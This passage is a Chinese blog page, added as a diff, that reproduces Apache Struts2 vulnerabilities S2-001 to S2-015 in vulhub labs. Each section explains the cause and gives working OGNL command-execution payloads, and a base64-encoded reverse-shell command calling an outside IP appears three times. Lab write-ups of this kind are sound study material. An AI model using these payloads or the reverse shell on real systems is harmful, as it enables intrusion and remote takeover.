@@ -1,0 +1,1731 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#00FFFF">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-corner-indicator.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#00FFFF">
+
+
+
+
+
+  <meta name="keywords" content="漏洞复现," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="vulhub漏洞复现-struts2">
+<meta name="keywords" content="漏洞复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulhub漏洞复现-struts2">
+<meta property="og:url" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;index.html">
+<meta property="og:site_name" content="CyzCc&#39;s blog">
+<meta property="og:description" content="vulhub漏洞复现-struts2">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1601890934209.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1601892193356.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1601892046803.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1601892613212.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1601885381985.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1601889749540.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1601892895530.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1601894335653.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1601894717354.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1601894945405.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1601895280536.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1601950673916.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1601950949791.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1601954540240.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1602038963485.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1602039230314.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1602040329106.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1602053557111.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1602055778591.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1602063578549.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1602063644370.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1602063944289.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1602064063432.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1602064773788.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1602064862767.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1602065036666.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1602065528480.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1602065637076.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1602066447445.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1602066479820.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1602070235888.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1602128952620.png">
+<meta property="og:updated_time" content="2020-12-07T07:50:34.455Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;10&#x2F;07&#x2F;vulhub-struts2&#x2F;1601890934209.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://cyzcc.vip/2020/10/07/vulhub-struts2/"/>
+
+
+
+
+<!--留言-->
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "9e261f4f"
+    });
+  daovoice('update');
+  </script>
+
+
+  <title>vulhub漏洞复现-struts2 | CyzCc's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">CyzCc's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">♫日常学习笔记整理♬♬</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-主页|随笔">
+          <a href="/home/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            主页|随笔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-一些知识点">
+          <a href="/guestbook/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-comments"></i> <br />
+            
+            一些知识点
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于我">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br />
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cyzcc.vip/2020/10/07/vulhub-struts2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="CyzCc">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CyzCc's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">vulhub漏洞复现-struts2</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-10-07T15:48:22+08:00">
+                2020-10-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/10/07/vulhub-struts2/" class="leancloud_visitors" data-flag-title="vulhub漏洞复现-struts2">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  4.4k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  22
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong>vulhub漏洞复现-struts2</strong></p>
+<a id="more"></a>
+
+<h1 id="s2-001"><a href="#s2-001" class="headerlink" title="s2-001"></a>s2-001</h1><p><code>原理：该漏洞因用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL表达式%{value}进行解析，然后重新填充到对应的表单数据中。如注册或登录页面，提交失败后一般会默认返回之前提交的数据，由于后端使用%{value}对提交的数据执行了一次OGNL 表达式解析，所以可以直接构造 Payload进行命令执行。</code></p>
+<p>影响版本：Struts 2.0.0 - 2.0.8</p>
+<p>工具梭哈<br><img src="/2020/10/07/vulhub-struts2/1601890934209.png" alt="1601890934209"></p>
+<p>payload</p>
+<p>获取tomcat执行路径：</p>
+<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="string">"tomcatBinDir&#123;"</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty</span>(<span class="string">"user.dir"</span>)+<span class="string">"&#125;"</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取Web路径：</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(<span class="string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span>).getWriter(),#response.println(#req.getRealPath(<span class="string">'/'</span>)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/07/vulhub-struts2/1601892193356.png" alt="1601892193356"></p>
+<p>命令执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">	</span><br><span class="line">%&#123;<span class="comment">#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"whoami"&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/07/vulhub-struts2/1601892046803.png" alt="1601892046803"></p>
+<p>记得url编码</p>
+<p>反弹shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="keyword">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMTA0LjE3Mi83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/07/vulhub-struts2/1601892613212.png" alt="1601892613212"></p>
+<h1 id="s2-005"><a href="#s2-005" class="headerlink" title="s2-005"></a>s2-005</h1><p><code>原理：s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开</code></p>
+<p>影响版本：Struts 2.0.0-2.1.8.1</p>
+<p>CVE编号:CVE-2010-1870</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HelloWord.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&apos;%5cu0023rt.exec(%22touch@/tmp/success123456%22.split(%22@%22))&apos;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure>
+
+<p>用<code>@</code>替换空格</p>
+<p>成功创建文件<br><img src="/2020/10/07/vulhub-struts2/1601885381985.png" alt="1601885381985"></p>
+<p>工具<br>该版本也存在s2-016漏洞</p>
+<p><img src="/2020/10/07/vulhub-struts2/1601889749540.png" alt="1601889749540"></p>
+<h1 id="s2-007"><a href="#s2-007" class="headerlink" title="s2-007"></a>s2-007</h1><p><code>原理：age来自于用户输入，传递一个非整数给id导致错误，struts会将用户的输入当作ongl表达式执行，从而导致了漏洞</code></p>
+<p>影响版本：Struts 2.0.0 - 2.2.3</p>
+<p>任然存在s2-016漏洞</p>
+<p>工具反弹shell<br><img src="/2020/10/07/vulhub-struts2/1601892895530.png" alt="1601892895530"></p>
+<p>payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+%2b+(%23_memberAccess["allowStaticMethodAccess"]%3dtrue,%23foo%3dnew+java.lang.Boolean("false")+,%23context["xwork.MethodAccessor.denyMethodExecution"]%3d%23foo,%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('</span>ls+/<span class="string">').getInputStream()))+%2b+'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/07/vulhub-struts2/1601894335653.png" alt="1601894335653"></p>
+<p>poc2</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">" + (#_memberAccess["</span>allowStaticMethodAccess<span class="string">"]=true,#foo=new java.lang.Boolean("</span><span class="keyword">false</span><span class="string">") ,#context["</span>xwork.MethodAccessor.denyMethodExecution<span class="string">"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("</span>whoami<span class="string">").getInputStream())) + "</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="s2-008"><a href="#s2-008" class="headerlink" title="s2-008"></a>s2-008</h1><p><code>原理：S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，但是这种情况在生产环境中几乎不可能存在，所以还是很鸡肋。</code></p>
+<p>影响版本：Struts 2.1.0 – 2.3.1</p>
+<p>该漏洞依然可使用s2-16进行利用<br>反弹shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="keyword">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMTA0LjE3Mi83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+<p>poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">devmode.action?debug=command&amp;expression=(%<span class="number">23</span>_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%<span class="number">3</span>f(%<span class="number">23</span>context[%<span class="number">23</span>parameters.rpsobj[<span class="number">0</span>]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%<span class="number">23</span>parameters.command[<span class="number">0</span>]).getInputStream()))):xx.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=<span class="number">123456789</span>&amp;command=id</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/07/vulhub-struts2/1601894717354.png" alt="1601894717354"></p>
+<h1 id="s2-009"><a href="#s2-009" class="headerlink" title="s2-009"></a>s2-009</h1><p><code>原理：OGNL提供了广泛的表达式评估功能等功能。该漏洞允许恶意用户绕过ParametersInterceptor内置的所有保护（正则表达式，拒绝方法调用），从而能够将任何暴露的字符串变量中的恶意表达式注入进行进一步评估。ParametersInterceptor中的正则表达式将top [&quot;foo&quot;]（0）作为有效的表达式匹配，OGNL将其作为（top [&quot;foo&quot;]）（0）处理，并将“foo”操作参数的值作为OGNL表达式求值。这使得恶意用户将任意的OGNL语句放入由操作公开的任何String变量中，并将其评估为OGNL表达式，并且由于OGNL语句在HTTP参数中，攻击者可以使用黑名单字符（例如＃）禁用方法执行并执行任意方法，绕过ParametersInterceptor和OGNL库保护。</code></p>
+<p>影响版本：Struts 2.1.0 - 2.3.1.1</p>
+<p>poc1</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ajax/example5.action?age=<span class="number">12313</span>&amp;name=(%<span class="number">23</span>context[%<span class="number">22</span>xwork.MethodAccessor.denyMethodExecution%<span class="number">22</span>]=+<span class="keyword">new</span>+java.lang.Boolean(<span class="keyword">false</span>),+%<span class="number">23</span>_memberAccess[%<span class="number">22</span>allowStaticMethodAccess%<span class="number">22</span>]=<span class="keyword">true</span>,+%<span class="number">23</span>a=@java.lang.Runtime@getRuntime().exec(%<span class="number">27</span>ls%<span class="number">27</span>).getInputStream(),%<span class="number">23</span>b=<span class="keyword">new</span>+java.io.InputStreamReader(%<span class="number">23</span>a),%<span class="number">23</span>c=<span class="keyword">new</span>+java.io.BufferedReader(%<span class="number">23</span>b),%<span class="number">23</span>d=<span class="keyword">new</span>+char[<span class="number">51020</span>],%<span class="number">23</span>c.read(%<span class="number">23</span>d),%<span class="number">23</span>kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%<span class="number">23</span>kxlzx.println(%<span class="number">23</span>d),%<span class="number">23</span>kxlzx.close())(meh)&amp;z[(name)(%<span class="number">27</span>meh%<span class="number">27</span>)]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/07/vulhub-struts2/1601894945405.png" alt="1601894945405"></p>
+<p>poc2</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /ajax/example5 HTTP/1.1</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 417</span><br><span class="line">Host: **********</span><br><span class="line"></span><br><span class="line"><span class="meta">z[%</span><span class="bash">28name%29%28%27meh%27%29]&amp;age=12313&amp;name=(<span class="comment">#context["xwork.MethodAccessor.denyMethodExecution"]=false,#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec("id").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#s=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#s.println(#d),#s.close())(meh)</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/07/vulhub-struts2/1601895280536.png" alt="1601895280536"></p>
+<p>工具依然可以梭哈</p>
+<h1 id="s2-012"><a href="#s2-012" class="headerlink" title="s2-012"></a>s2-012</h1><p><code>原理：如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。</code></p>
+<p>影响版本：Struts 2.1.0-2.3.13</p>
+<p>poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="comment">#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"/bin/bash","-c", "ls"&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/07/vulhub-struts2/1601950673916.png" alt="1601950673916"></p>
+<p>工具检测同样具有s2-016漏洞</p>
+<p>反弹shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="keyword">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMTA0LjE3Mi83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/07/vulhub-struts2/1601950949791.png" alt="1601950949791"></p>
+<h1 id="s2-013"><a href="#s2-013" class="headerlink" title="s2-013"></a>s2-013</h1><p>原理：struts2的标签中  和  都有一个 includeParams 属性，可以设置成如下值</p>
+<ul>
+<li>none - URL中不包含任何参数（默认）</li>
+<li>get - 仅包含URL中的GET参数</li>
+<li>all - 在URL中包含GET和POST参数</li>
+</ul>
+<p>此时 或尝试去解析原始请求参数时，会导致OGNL表达式的执行</p>
+<p>影响版本：Struts 2.0.0-2.3.14</p>
+<p>payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(<span class="comment">#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/07/vulhub-struts2/1601954540240.png" alt="1601954540240"></p>
+<p>工具梭哈，s2-16、s2-48</p>
+<h1 id="s2-015"><a href="#s2-015" class="headerlink" title="s2-015"></a>s2-015</h1><p><code>原理：如果一个请求与任何其他定义的操作不匹配，它将被匹配*，并且所请求的操作名称将用于以操作名称加载JSP文件。并且，1作为OGNL表达式的威胁值，{ }可以在服务器端执行任意的Java代码。这个漏洞是两个问题的组合：</code></p>
+<ul>
+<li>请求的操作名称未被转义或再次检查白名单</li>
+<li>在TextParseUtil.translateVariables使用组合$和%开放字符时对OGNL表达式进行双重评。</li>
+</ul>
+<p>影响版本：Struts 2.0.0 - 2.3.14.2</p>
+<p>poc1</p>
